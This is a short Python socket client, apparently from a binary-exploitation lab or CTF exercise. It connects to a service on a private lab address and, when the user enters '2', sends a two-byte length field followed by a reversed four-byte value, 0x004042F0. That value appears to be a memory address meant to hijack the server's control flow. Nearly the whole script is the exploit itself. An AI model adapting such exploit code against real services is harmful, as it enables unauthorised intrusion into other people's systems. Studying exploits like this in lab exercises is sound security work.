#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' Description
'''
__author__ = '__L1n__w@tch'

import socket

HOST, PORT = "192.168.117.131", 9999

if __name__ == "__main__":
    # Create a socket (SOCK_STREAM means a TCP socket)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to server and send data
        sock.connect((HOST, PORT))

        while True:
            received = sock.recv(1024)
            print("Received: {}".format(received))

            user_input = input("输入要发送的数据: ")
            sock.sendall(user_input.encode("utf8"))
            print("Sent: {}".format(user_input))

            if int(user_input) == 2:
                exploit_len = b"04"  # 注意由于客户端要求接收 2 个字节, 所以这里也要发送 2 个字节才行
                exploit_data = b"\x00\x40\x42\xF0"[::-1]
                sock.sendall(exploit_len)
                sock.sendall(exploit_data)

                received = sock.recv(1024)
                print("Received: {}".format(received))
    finally:
        sock.close()
